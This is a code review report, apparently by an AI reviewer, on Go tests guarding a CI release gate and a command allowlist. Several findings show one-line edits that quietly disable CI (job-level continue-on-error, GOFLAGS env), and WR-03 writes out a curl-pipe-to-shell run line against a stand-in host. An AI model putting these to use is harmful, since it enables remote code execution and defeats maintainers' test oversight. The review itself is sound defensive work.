---
phase: 172-wiring-proof
reviewed: 2026-08-12T11:54:10Z
depth: standard
files_reviewed: 8
files_reviewed_list:
  - cmd/ci_wiring_gate_test.go
  - cmd/subcommand_reachability_ratchet_test.go
  - cmd/cli_flag_audit_test.go
  - .github/workflows/ci.yml
  - .aether/docs/orphan-allowlist-policy.md
  - cmd/testdata/orphan_allowlist.json
  - cmd/testdata/orphan_allowlist_baseline.json
  - cmd/testdata/orphan_allowlist_baseline_pre_path_migration.json
findings:
  critical: 5
  warning: 10
  info: 8
  total: 23
status: issues_found
---

# Phase 172: Code Review Report (re-review after 172-09 / 172-10 / 172-11)

**Reviewed:** 2026-08-12T11:54:10Z
**Depth:** standard
**Files Reviewed:** 8
**Status:** issues_found

## Summary

The three gap-closure plans did real work. I confirmed the following independently:

- **The execution harness is genuinely bidirectional.** `gateCommandDiscriminates`
  (ci_wiring_gate_test.go:795) asserts `passExit == 0` *before* it asserts
  `failExit != 0`. A permanently-failing probe cannot satisfy the "broken tree
  fails" half — it trips the false-alarm branch first. The pass and fail probe
  modules differ by exactly one `t.Fatal` line, so a build error affects both
  and surfaces as a loud failure on the clean probe rather than a spurious pass
  on the failing one. There is no `t.Skip`, no early `return`, and no
  environment-dependent branch anywhere in the harness; missing `go`/`sh`
  `t.Fatalf` rather than skipping (ci_wiring_gate_test.go:834-839).
- **The allowlist arithmetic is honest.** I recomputed it from the three JSON
  files: 278 pre-migration leaf entries → 274 map one-to-one, plus 4 collapsed
  leaves (`get`→3, `set`→3, `registry`→2, `wisdom`→2) expanding to 10 paths,
  plus 9 newly revealed = **293**. `pheromones` is *not* in the pre-migration
  snapshot, which is consistent with `export pheromones` / `import pheromones`
  being classified as newly revealed. No pre-migration leaf was silently
  dropped. Live and baseline are byte-identical sets.
- **The path-collision regression test is genuinely independent.**
  `TestCallerEvidenceIsNotSharedBetweenSameLeafNames` (ratchet:1203) registers
  `ratchet-selftest-parent`/`ratchet-selftest-collide` fixtures inside its own
  body and removes them on defer. It will outlive the repair of `colonize` and
  `closeout`.
- **The `-run` filter is complete in both directions.** I enumerated all 30
  top-level `Test…` functions across the five guard files and matched them
  against the filter at ci.yml:100 — zero uncovered, zero stale.
- **The regeneration flag cannot launder the ratchet.**
  `-update-orphan-allowlist` writes only the live list; a regenerated live list
  containing a new orphan still fails `TestOrphanAllowlistOnlyShrinks`.

The suite is currently green (`go test ./cmd -run '<the ten new/changed
guards>' -count=1` → ok, 5.6s).

**But the guards are still defeatable, and the defeats are cheap.** All five
Critical findings are one-line edits to `.github/workflows/ci.yml` or to a
checked-in JSON file that leave every guard in this phase green. Two of them
(**CR-01**, **CR-02**) neuter the release gate completely. **CR-02 is verified
empirically**, not inferred. The pattern is the same one this phase has now
failed on three times: the guards check the *shapes of disabling they have
enumerated*, and 172-11 enumerated four routes (commented-out step,
step-level `if:`/`continue-on-error`, `on:` triggers, job-level `if:`) while
leaving the adjacent siblings of each — job-level `continue-on-error`,
job-level `env:`, trigger-level `paths-ignore:` — unchecked.

The execution proof (172-10) is real but narrower than its comments claim: it
proves the extracted command discriminates *on a synthetic two-file module*,
not that it covers this repo's own tests. Everything that keeps `TestGateProbe`
running while excluding the repo's tests passes it. The residual protection
against that class is entirely the exact-equality pin at
ci_wiring_gate_test.go:58 — which the file's own comments twice disclaim as
"NOT the proof" (lines 50-51, 841-845). Those comments should be corrected;
the pin is load-bearing.

---

## Critical Issues

### CR-01: A job-level `continue-on-error` disables the entire release gate, and no guard sees it

**File:** `cmd/ci_wiring_gate_test.go:1053-1082`
**Issue:** `TestReleaseGateWorkflowActuallyRuns` extracts the `go:` job header
(the lines between `  go:` and `steps:`) and scans it for exactly one thing: a
line whose trimmed text starts with `if:`. `continue-on-error` is checked only
by `stepCanFailTheBuild`, which is passed a *step* block
(ci_wiring_gate_test.go:127, 381) that begins at the `- name:` line and
therefore can never contain a job-level key.

Adding this to `.github/workflows/ci.yml` makes the whole `go` job non-blocking
— every test can fail and the workflow still reports success:

```yaml
jobs:
  go:
    runs-on: ubuntu-latest
    continue-on-error: true        # <- nothing in phase 172 checks this
    steps:
      ...
```

Traced: `jobHeaderLines` = `lines[goJobLineIdx+1 : stepsLineIdx]`, which would
contain `    continue-on-error: true`; the only loop over it
(lines 1077-1082) tests `strings.HasPrefix(trimmed, "if:")`. No other guard
reads the job header. This is the same class of bypass 172-11 was written to
close, one indentation level up from the one it closed.

**Fix:** Apply the same failing-capability standard to the job header that
`stepCanFailTheBuild` applies to steps:

```go
for _, line := range jobHeaderLines {
	trimmed := strings.TrimSpace(line)
	if strings.HasPrefix(trimmed, "if:") {
		t.Fatalf("... job-level condition (%s) ...", trimmed)
	}
	if strings.HasPrefix(trimmed, "continue-on-error:") {
		t.Fatalf("the check that is supposed to run on every change would no longer fail anything: "+
			"the %q job carries a job-level %s — a job whose failure does not fail the workflow is not a gate", "go", trimmed)
	}
}
```

Better still: reuse `stepCanFailTheBuild(strings.Join(jobHeaderLines, "\n"), "go job")` so
the two paths cannot drift apart again.

---

### CR-02: A workflow/job/step-level `env: GOFLAGS` neuters `go test ./...` while the run line stays byte-identical (verified)

**File:** `cmd/ci_wiring_gate_test.go:361-386, 992-1098`; `.github/workflows/ci.yml:41-42`
**Issue:** Nothing in this phase reads an `env:` block — not
`blanketReleaseGateProblem`, not `stepCanFailTheBuild`, not
`TestReleaseGateWorkflowActuallyRuns`. And the execution harness
(`runGateCommand`, ci_wiring_gate_test.go:759-786) deliberately leaves
`cmd.Env` nil so the subprocess inherits *the developer's / CI runner's*
environment — never the workflow's. So the one thing that would catch this by
execution cannot see it either.

I verified the neutering empirically in a throwaway module:

```
$ go test ./... -count=1 -timeout 900s          # test calls t.Fatal
--- FAIL: TestGateProbe
exit=1
$ GOFLAGS=-run=TestNothingZZZ go test ./... -count=1 -timeout 900s
ok   gp  0.186s [no tests to run]
exit=0
```

So this edit disables the release gate entirely and leaves every phase-172
guard green — the run line is unchanged and byte-identical to
`blanketGateRunCommand`, there is no `if:`, no `continue-on-error`, both
triggers are present, and the job header has no `if:`:

```yaml
jobs:
  go:
    runs-on: ubuntu-latest
    env:
      GOFLAGS: -run=TestNothingZZZ    # <- invisible to every guard
```

The same works at step level (`- name: Run Go tests` + `env:`) and at workflow
level. This is the "sixth mutation nobody has enumerated yet" that the comment
at ci_wiring_gate_test.go:655-661 asserts the execution approach would catch —
it does not, because the mutation is not in the command string.

**Fix:** Reject `env:` on the gate step and in the job header unless it is on a
reviewed allowlist of keys, and specifically reject `GOFLAGS`/`GOTOOLCHAIN`/
`GOEXPERIMENT` anywhere in the workflow file:

```go
// In blanketReleaseGateProblem, after the run-line equality check:
if strings.Contains(block, "env:") {
	return fmt.Errorf("CI step %q carries an env: block — GOFLAGS alone (e.g. -run=Nothing) makes this command exit 0 with a failing test, so an env block on the gate step is not reviewable by inspecting the run line", blanketGateStepName)
}

// In TestReleaseGateWorkflowActuallyRuns, over the whole file:
for i, line := range lines {
	if strings.Contains(line, "GOFLAGS") || strings.Contains(line, "GOTOOLCHAIN") {
		t.Fatalf(".github/workflows/ci.yml:%d sets %s — these silently rewrite what `go test` runs: %s", i+1, "a go toolchain env var", strings.TrimSpace(line))
	}
}
```

Also consider making the harness prove the *effective* command: pass the
workflow's declared env into `runGateCommand` rather than inheriting the
ambient one.

---

### CR-03: The `on:` trigger check is a substring test, so `paths-ignore: ['**']` disables the workflow with both trigger names still present

**File:** `cmd/ci_wiring_gate_test.go:1025-1032`
**Issue:** The check is:

```go
onBlock := strings.Join(lines[onLineIdx:jobsLineIdx], "\n")
if !strings.Contains(onBlock, "pull_request:") { ... }
if !strings.Contains(onBlock, "push:") { ... }
```

This is the *same shape of check* the phase already rejected twice for the run
line — a substring test that only detects deletion. Every one of these leaves
both substrings present and stops the workflow from ever running:

```yaml
on:
  pull_request:
    branches: [main]
    paths-ignore: ['**']        # never runs on any PR
  push:
    branches: [main]
    paths-ignore: ['**']
```

or `branches: [main-disabled]`, or `types: [labeled]` with a label nobody
applies. 172-11's stated coverage was "disabled `on:` triggers"; only literal
removal is actually covered.

**Fix:** Parse the trigger blocks structurally and reject the disabling keys
rather than searching for the trigger names:

```go
for _, trigger := range []string{"pull_request", "push"} {
	blk, err := triggerBlock(onBlock, trigger) // 2-space-indent block under on:
	if err != nil {
		t.Fatalf("...on: block no longer names the %s trigger", trigger)
	}
	for _, key := range []string{"paths-ignore:", "paths:", "types:", "branches-ignore:"} {
		if strings.Contains(blk, key) {
			t.Fatalf("the %s trigger carries %s — a filter can stop the workflow firing while the trigger name is still present: %s", trigger, key, blk)
		}
	}
	if !strings.Contains(blk, "branches: [main]") {
		t.Fatalf("the %s trigger no longer targets main: %s", trigger, blk)
	}
}
```

---

### CR-04: The shrink-only guarantee is launderable — a new orphan whose last word matches any of 278 already-tolerated leaves passes every check

**File:** `cmd/subcommand_reachability_ratchet_test.go:1433-1460`;
`.aether/docs/orphan-allowlist-policy.md:41-51`
**Issue:** The composite guarantee is only as strong as its weakest link, and
the chain is:

1. `TestOrphanAllowlistOnlyShrinks` (ratchet:1365) diffs **live vs baseline**.
   Editing both files in one commit satisfies it trivially. This is by design —
   the baseline is meant to be the anchor.
2. `TestPathMigrationDidNotWidenTolerance` (ratchet:1433) is the only thing
   anchoring the baseline. It compares **leaf names**:
   `leaf := e.Name[strings.LastIndex(e.Name, " ")+1:]`, then `if preLeaves[leaf] { continue }`.

So any new baseline entry whose *last word* already appears anywhere in the
frozen 278-name snapshot is accepted with no failure. I enumerated the
snapshot: 278 tolerated leaf names, including 14 completely generic
single-word ones — `archive`, `export`, `get`, `import`, `integrity`,
`lifecycle`, `proof`, `reconcile`, `registry`, `serve`, `set`, `setup`,
`versions`, `wisdom`.

Concretely: add a brand-new, entirely unwired command `aether newthing get`,
add `{"name": "aether newthing get", ...}` to both
`orphan_allowlist.json` and `orphan_allowlist_baseline.json`, and:
`TestOrphanAllowlistOnlyShrinks` passes (live ⊆ baseline),
`TestOrphanAllowlistIsPathKeyed` passes (it resolves),
`TestPathMigrationDidNotWidenTolerance` passes (`get` ∈ preLeaves),
`TestNoRegisteredSubcommandIsUnreferenced` passes (it is allowlisted).
Nothing goes red. The `set`/`get` pattern is not hypothetical — this repo
already has three `… get` and three `… set` subcommands, and adding a fourth
config-pair command is routine work.

This directly contradicts the policy document, which states without
qualification (orphan-allowlist-policy.md:43-46): *"Both lists can only get
shorter. A name can never be added to either list. If someone tries to add one
… the automated check that runs on every change fails immediately, by name."*
Under CLAUDE.md's own rule — *"A documentation claim about runtime behaviour
must be testable or removed"* — that sentence is currently false.

**Fix:** Compare on the full path, and reconcile the 4 known collapsed leaves
explicitly rather than by a blanket leaf rule:

```go
// Freeze the migration mapping once, as data, instead of re-deriving it by leaf:
// pre-migration leaf -> the exact set of post-migration paths it legitimately expanded to.
var pathMigrationExpansion = map[string][]string{
	"get":      {"aether colony-depth get", "aether parallel-mode get", "aether plan-granularity get"},
	"set":      {"aether colony-depth set", "aether parallel-mode set", "aether plan-granularity set"},
	"registry": {"aether export registry", "aether import registry"},
	"wisdom":   {"aether export wisdom", "aether import wisdom"},
}

// Then every baseline entry must be one of:
//   - the single canonical path for a 1:1 carried-forward leaf,
//   - a member of pathMigrationExpansion[leaf],
//   - a member of pathCollisionRevealedOrphans.
// Anything else — including "aether newthing get" — fails by name.
```

That turns the anchor from "leaf appeared once, somewhere" into an explicit
274 + 10 + 9 = 293 accounting that a new entry cannot slip into.

---

### CR-05: The frozen pre-migration snapshot — the anchor for every shrink-only claim — has no integrity pin

**File:** `cmd/testdata/orphan_allowlist_baseline_pre_path_migration.json`;
`cmd/subcommand_reachability_ratchet_test.go:189-197, 1435`
**Issue:** The policy document calls this file *"frozen, never-edited-again"*
and *"byte-identical"* (orphan-allowlist-policy.md:97-99, 161-163), and
`loadPreMigrationReasonByLeaf`'s doc comment repeats *"frozen, byte-identical"*
(ratchet:184-188). Nothing enforces it. I grepped the whole repo: the file is
referenced in exactly three places — two `loadOrphanAllowlist` calls and one
string in `guardedAllowlistFiles` — and by no hash check, no `git`-blob
assertion, and no immutability test.

Adding a line to that file therefore widens the tolerance ceiling for *every*
future entry, silently, and is indistinguishable in the test output from
changing nothing. Combined with CR-04 this means the entire "the list can only
shrink" property rests on a mutable, unverified file plus human review — which
is precisely the standard CLAUDE.md's Definition of Done exists to replace
(*"Not a commit. Not a checked box in a summary."*).

`TestWiringGuardsHaveNoRuntimeEscapeHatch` already proves the update flag
cannot *write* this file (ratchet:1701), but that only covers programmatic
writes, not hand edits.

**Fix:** Pin the content hash in Go source, where changing it is an obvious,
reviewable code edit rather than a JSON line:

```go
// preMigrationSnapshotSHA256 is the hash of the frozen snapshot as committed by
// 172-09. This file is the anchor every shrink-only claim rests on; editing it
// widens tolerance for every future entry, so its content is pinned here rather
// than trusted. If this ever needs to change, the change is a code review of
// this constant, not a silent JSON edit.
const preMigrationSnapshotSHA256 = "<sha256 of the file as committed>"

func TestPreMigrationSnapshotIsFrozen(t *testing.T) {
	data, err := os.ReadFile("testdata/orphan_allowlist_baseline_pre_path_migration.json")
	if err != nil {
		t.Fatalf("read frozen snapshot: %v", err)
	}
	got := fmt.Sprintf("%x", sha256.Sum256(data))
	if got != preMigrationSnapshotSHA256 {
		t.Fatalf("the frozen pre-migration snapshot has been edited (sha256 %s, want %s) — "+
			"this file is the anchor for every shrink-only guarantee and must never change", got, preMigrationSnapshotSHA256)
	}
}
```

Add this test to the ci.yml `-run` filter and to `wiringGateGuardFiles`
coverage in the same change.

---

## Warnings

### WR-01: The named wiring step is held to a *weaker* standard than the blanket step, contradicting the file's own comment

**File:** `cmd/ci_wiring_gate_test.go:89-97, 123-129, 596-620`
**Issue:** The comment at lines 89-97 says the wiring step "must also be held
to the failing-capability standard (WR-02 / T-172-57)". In practice the blanket
step gets *exact string equality* (`cmd != blanketGateRunCommand`,
line 377) while the wiring step gets only `stepCanFailTheBuild` — which checks
`if:` and `continue-on-error` and nothing else — plus a
`strings.Contains(runLine, "go test ./cmd ")` and a "exactly one `-run` flag"
check.

So all five of the exact mutations 172-10 was written to defeat still work on
the wiring step's run line, and nothing goes red:

```yaml
      - name: Verify subcommand wiring and CLI flag contracts
        run: go test ./cmd -run '...' -count=1 -timeout 900s || true
```
(also `; true`, `| cat`, `&& true`, or output redirection). The blanket step
still runs the same tests, so coverage is preserved — but D-15's entire stated
purpose for this step is *legibility*, and legibility is exactly what
`|| true` destroys.

**Fix:** Give the wiring step the same treatment. Reject a run line that
contains any of `||`, `;`, `|`, `&&`, or `>` after the `-run` argument, or
better, pin its structure:

```go
if idx := strings.Index(trimmedRunLine, "'"); idx != -1 {
	tail := trimmedRunLine[strings.LastIndex(trimmedRunLine, "'")+1:]
	if strings.ContainsAny(tail, ";|&>") {
		return "", fmt.Errorf("CI step %q's run line has shell control characters after its -run filter, which can swallow its exit status: %s", wiringGateStepName, trimmedRunLine)
	}
}
```

### WR-02: `-update-orphan-allowlist` can be appended to the CI wiring step, turning the ratchet into a regenerator that returns early

**File:** `cmd/subcommand_reachability_ratchet_test.go:1127-1131`; `.github/workflows/ci.yml:100`
**Issue:** When the flag is set, `TestNoRegisteredSubcommandIsUnreferenced`
writes the live allowlist and `return`s — skipping the allowlist diff, the
`unallowed` check, the D-08 `owner_phase` assertions, and the "exactly 6
entries with owner_phase 178" count. Because the wiring step's run line accepts
arbitrary appended arguments (WR-01), `go test ./cmd -run '…' -count=1
-timeout 900s -update-orphan-allowlist` passes every structural check while the
ratchet's core assertion never executes.

Partial mitigation: `TestOrphanAllowlistOnlyShrinks` runs afterwards in the
same binary and would catch a *newly added* orphan. But the D-08 `owner_phase`
assertions and the `unallowed` naming are lost unconditionally, and the
mitigation depends on Go's within-file test ordering, which is not a contract.

**Fix:** Split regeneration out of the assertion test so the assertion can
never be skipped:

```go
func TestNoRegisteredSubcommandIsUnreferenced(t *testing.T) {
	// … compute orphans …
	if *updateOrphanAllowlist {
		t.Fatalf("-update-orphan-allowlist is a local maintenance switch and must never be set in an assertion run; " +
			"run `go test ./cmd -run TestUpdateOrphanAllowlist -update-orphan-allowlist` instead")
	}
	// … assertions always run …
}
```
…with regeneration living in its own `TestUpdateOrphanAllowlist` that is *not*
in the CI `-run` filter.

### WR-03: The harness executes an attacker-controllable string from `ci.yml` through `sh -c` on every `go test ./...`

**File:** `cmd/ci_wiring_gate_test.go:759-786, 817-866, 881-973`
**Issue:** `TestReleaseGateCommandFailsATreeWithAFailingTest` reads the `Run Go
tests` run line verbatim from `.github/workflows/ci.yml` and runs it through
`exec.CommandContext(ctx, "sh", "-c", command)`. The only pre-flight check is
`strings.Contains(command, "go test")` (line 846) — explicitly labelled a
"sanity floor". So a pull request containing

```yaml
      - name: Run Go tests
        run: go test ./... -count=1 -timeout 900s; curl -s https://x/y | sh
```

is executed 16 times (twice here, 14 more in
`TestGateProbeCatchesEveryKnownGateNeutering`) on any machine that runs
`go test ./...` — including a maintainer reviewing that PR locally.
`TestWiringGateStepRunsEveryWiringTest` would separately fail on the equality
check, but the execution happens regardless, in the same run, before anyone
reads the failure.

Mitigating context: running `go test ./...` on an untrusted branch is already
arbitrary code execution via `_test.go` files. The marginal escalation is that
a YAML file — which reviewers do not treat as executable — becomes an execution
vector.

**Fix:** Validate before executing, not after. Require
`command == blanketGateRunCommand` (or at minimum reject
`;`, `|`, `&`, `` ` ``, `$(`) before handing the string to `sh -c`, and keep
the equality check as a hard precondition of the execution test rather than a
separate test:

```go
if err := blanketReleaseGateProblem(string(data)); err != nil {
	t.Fatalf("refusing to execute the extracted command: %v", err)
}
```

### WR-04: The execution proof runs against a synthetic probe, not this repo — its own comments overstate what it establishes

**File:** `cmd/ci_wiring_gate_test.go:44-57, 649-672, 810-816, 841-848, 868-880`
**Issue:** `writeGateProbeModule` builds a module containing exactly one test,
`TestGateProbe`. What the harness proves is: *"this command string, run in a
module whose only test is TestGateProbe, exits non-zero iff TestGateProbe
fails."* It does **not** prove the command runs this repository's tests. Any
narrowing that excludes the repo's real tests while leaving `TestGateProbe`
matched sails through:

- `go test ./... -count=1 -timeout 900s -skip 'TestNoRegisteredSubcommand.*'`
- `go test ./... -count=1 -timeout 900s -run 'TestGateProbe'`
- `GOFLAGS=-skip=…` (see CR-02)

The `-run TestNothingAtAll` row in the table (line 935) passes only by the
accident that the chosen name matches nothing in the probe.

That residual class is caught today — but only by the exact-equality pin at
line 58, which the file's comments twice tell a future reader is *not* the
proof (lines 50-51: *"It is NOT the proof … and must never be mistaken for
one"*; lines 841-845: *"Sanity floor only — NOT the proof, and must never be
allowed to become the proof"*). A future maintainer following those comments
would relax the pin and silently open the hole.

**Fix:** Correct the comments to state the actual division of labour — *the
pin establishes that the gate is unnarrowed; the execution establishes that the
unnarrowed command discriminates* — and, better, close the gap for real by
running the extracted command against a probe whose test names mirror a real
guard test (e.g. name the probe test `TestNoRegisteredSubcommandIsUnreferenced`
so a `-skip`/`-run` narrowing aimed at the real suite also silences the probe).

### WR-05: `TestAllowlistPolicyNamesEveryGuardedFile` uses a `..`-relative path — the exact pattern the same file bans 270 lines earlier

**File:** `cmd/cli_flag_audit_test.go:356` (vs. the rule at lines 82-90)
**Issue:** Lines 82-90 state the rule explicitly: *"Root-resolved, not
`..`-relative: a `..`-relative path silently mis-scopes the corpus depending on
the test binary's working directory, and cannot be told apart from 'directory
legitimately moved' (T-172-38)."* Line 356 then does
`os.ReadFile("../.aether/docs/orphan-allowlist-policy.md")`.

It happens to work because `go test` sets cwd to the package directory, but it
is the banned pattern, in the file that bans it, guarding the policy document
that describes the ban.

**Fix:**
```go
root, err := repoRootForCommandSourceTest()
if err != nil {
	t.Fatalf("resolve repo root: %v", err)
}
data, err := os.ReadFile(filepath.Join(root, ".aether", "docs", "orphan-allowlist-policy.md"))
```

### WR-06: The policy document's own arithmetic narrative is inaccurate, and its headline guarantee is false

**File:** `.aether/docs/orphan-allowlist-policy.md:41-51, 130-144`
**Issue:** Two problems.

1. Lines 141-144: *"The remaining **278** are carried forward unchanged from
   before the migration (just renamed to their whole-command form)."* Not
   true. **284** entries are carried forward, and 6 of them are genuinely new
   rows created by splitting 4 collapsed leaf entries — `get` became three
   rows, `set` three, `registry` two, `wisdom` two. The document never mentions
   leaf-splitting at all, so a reader reconciling 278 → 293 cannot. (The 6 / 9 /
   278 partition is arithmetically valid as a *reason-tag* breakdown; the prose
   describing it as a rename is what is wrong.)
2. Lines 43-46: *"A name can never be added to either list. If someone tries to
   add one … the automated check that runs on every change fails immediately,
   by name."* False — see CR-04. Lines 100-105 then describe the actual,
   weaker leaf-based rule, so the document contradicts itself.

**Fix:** Replace the 278 sentence with the real accounting (274 renamed
one-to-one + 10 from splitting 4 collapsed last-word entries + 9 newly
revealed), and downgrade the absolute claim in lines 43-46 to what the tests
actually enforce — or, preferably, fix CR-04 and make the sentence true.

### WR-07: Parent/grouping cobra nodes are counted as orphans, so the allowlist contains permanently unfixable entries

**File:** `cmd/subcommand_reachability_ratchet_test.go:236-261, 891-928`
**Issue:** `enumerateRegisteredCommands` treats every node in the tree
identically. `aether host` (cmd/host_cmd.go:15-21) has a `RunE` whose entire
body is `return fmt.Errorf("a subcommand is required")` — it is a menu, not a
command. It is now in the allowlist as `path-collision-revealed` / `RECLAIM`,
alongside `aether export`, `aether import`, `aether registry` and friends.

These cannot be given a caller (nobody types a bare menu name) and cannot be
deleted (their children depend on them), so they are permanent residue. That
matters because the whole allowlist is framed as a shrink-to-zero backlog, and
the policy document tells the reader the list can only get shorter — for these
entries it can only get shorter by deleting working features.

**Fix:** Exclude nodes that are pure groupings, and prove the exclusion is
narrow:

```go
// A command with children and no real Run/RunE of its own is a menu, not a
// command — nothing can "call" it and deleting it would delete its children.
// Excluded from the orphan scan, and asserted narrow: a node with children
// AND a real Run body is still scanned.
if len(child.Commands()) > 0 && child.Run == nil && child.RunE == nil {
	walk(child)
	continue
}
```
`aether host` needs a decision either way, since its `RunE` exists purely to
print an error — either give it `Run: nil` so this rule catches it, or record
it as a permanent exemption with a reason that says so, instead of `RECLAIM`.

### WR-08: The anti-vacuity floor tolerates a third of the guard tests being deleted

**File:** `cmd/ci_wiring_gate_test.go:150-159`
**Issue:** The floor is `len(testNames) < 20` against a measured 30. Deleting
up to 10 of the 30 guard tests does not trip it. The comment says 20 is "set
just under" 30, which is a 33% margin, not "just under". The stale-alternative
check (lines 182-204) covers most of the gap — but not all of it (see WR-09).

**Fix:** Tighten to a value that reflects the actual measurement and the
churn you expect — `< 28` — and record the measured count in the message so a
drift is visible:
```go
const measuredGuardTestCount = 30
if len(testNames) < measuredGuardTestCount-2 { ... }
```

### WR-09: Prefix-shadowed `-run` alternatives can go stale without detection

**File:** `cmd/ci_wiring_gate_test.go:182-204`
**Issue:** The stale check asks whether each `|`-separated alternative matches
*at least one* guard test name, using unanchored regex semantics. The
alternative `TestCLIFlagAudit` also matches
`TestCLIFlagAuditSubcommandsRegistered`. So deleting `TestCLIFlagAudit` itself
leaves the alternative "not stale", and the deletion is reported by nothing.
I checked the other 29 alternatives — this is the only current instance, but
the pattern recurs whenever a test name is a prefix of a sibling's.

**Fix:** Require an exact match for the stale check, since these alternatives
are plain names not regexes:
```go
matched := false
for _, name := range testNames {
	if alt == name || alt == "^"+name+"$" {
		matched = true
		break
	}
}
```
(and keep the existing unanchored `re.MatchString` for the forward coverage
direction, which correctly mirrors `go test -run`).

### WR-10: The escape-hatch scan covers a hand-maintained 5-file inventory and one spelling of "skip"

**File:** `cmd/subcommand_reachability_ratchet_test.go:1613-1691`
**Issue:** Two narrownesses:

1. `forbiddenRe` matches the literal receiver name `t`. A guard written as
   `func TestX(tb *testing.T) { tb.Skip() }` is not matched, nor is a bare
   `if cond { return }` early exit, nor `runtime.GOOS` branching.
2. The scan covers only `wiringGateGuardFiles` — but the guard tests call into
   at least `cmd/command_source_hygiene_test.go`
   (`repoRootForCommandSourceTest`) and `cmd/visual_writer_discipline_test.go`
   (`declNameAndBody`), neither of which is scanned. A `t.Skip` added to a
   helper that takes `*testing.T` would skip the caller.

`repoRootForCommandSourceTest` is currently clean (it reads no environment and
returns an error rather than skipping), so this is latent rather than live.

**Fix:** Match any `*testing.T`-shaped receiver
(`\b\w+\.Skip(Now)?\b`), and extend the inventory to the transitive helper
files the guards actually call — or assert that the guard files import nothing
outside the inventory.

---

## Info

### IN-01: Stale comment — "the four files"
**File:** `cmd/cli_flag_audit_test.go:38`
The slice now holds five entries (172-09 added the pre-migration snapshot) and
the test below it requires `>= 5`. Update the comment to "the five files".

### IN-02: Redundant duplicated parameter
**File:** `cmd/subcommand_reachability_ratchet_test.go:1395, 1418-1419`
`check(t *testing.T, path, listPath string)` — both call sites pass the same
string twice (`check(t, "testdata/orphan_allowlist.json", "testdata/orphan_allowlist.json")`).
Drop one parameter.

### IN-03: Dead alias-matching branch and unused field
**File:** `cmd/subcommand_reachability_ratchet_test.go:220-226, 244-255, 902-909`
`evidence` is only ever populated with `target.CommandPath()` from
`rootCmd.Find`, which already resolves aliases to their canonical command. So
`evidence[aliasPath]` in `computeOrphanNames` can never be true, and
`registeredCommandInfo.Aliases` is written but never read. Harmless, but it
suggests alias handling that isn't actually reachable. Either delete both or
add a test that proves an alias-only caller is credited.

### IN-04: Hardcoded timeout in an error message
**File:** `cmd/ci_wiring_gate_test.go:775`
The message says "did not complete within 120s" while the value lives in
`gateCommandTimeout` (line 749). Use `%v` with the constant.

### IN-05: `runLineOf` matches any key ending in `run:`
**File:** `cmd/ci_wiring_gate_test.go:319-329`
`strings.Index(block, "run:")` would match inside `prerun:` / `postrun:` and
return the wrong line. Not triggerable by today's ci.yml, but brittle. Anchor
to a line whose trimmed text starts with `run:`.

### IN-06: A commented-out following step is absorbed into the current step's block
**File:** `cmd/ci_wiring_gate_test.go:281-314`
`blockEnd` terminates on a same-indent `- name: ` line or a shallower indent. A
line like `      # - name: X` is neither, so a commented-out next step (and its
commented body) becomes part of the preceding step's block. If that comment
contains the text `continue-on-error`, `stepCanFailTheBuild`'s
`strings.Contains(block, "continue-on-error")` (line 347) reports a false
failure. Loud, not silent — but it is the same class of misdiagnosis recorded
as IN-05 in the previous review.

### IN-07: Documented-unreachable dead code
**File:** `cmd/subcommand_reachability_ratchet_test.go:912-921`
The `seen[c.Path]` branch in `computeOrphanNames` is annotated
"Unreachable" and kept deliberately as defence. That is a defensible choice,
but as written it would *hide* a future duplicate rather than surface it. A
`t.Errorf`-equivalent (returning an error from the function) would be a real
guard; a silent `continue` is not.

### IN-08: CRLF-sensitivity and inconsistent first/last-wins in the workflow scanner
**File:** `cmd/ci_wiring_gate_test.go:1008-1021`
`strings.TrimRight(line, " ")` does not strip `\r`, so a CRLF checkout makes
every `case "on:"` / `case "jobs:"` miss and the test fatals with "does not
have the expected top-level on:/jobs: shape" — a confusing failure for an
unrelated cause. Also `onLineIdx` is first-wins while `jobsLineIdx` is
last-wins-then-break; make both consistent. Use
`strings.TrimSpace(line)` (or `TrimRight(line, " \t\r")`).

---

_Reviewed: 2026-08-12T11:54:10Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
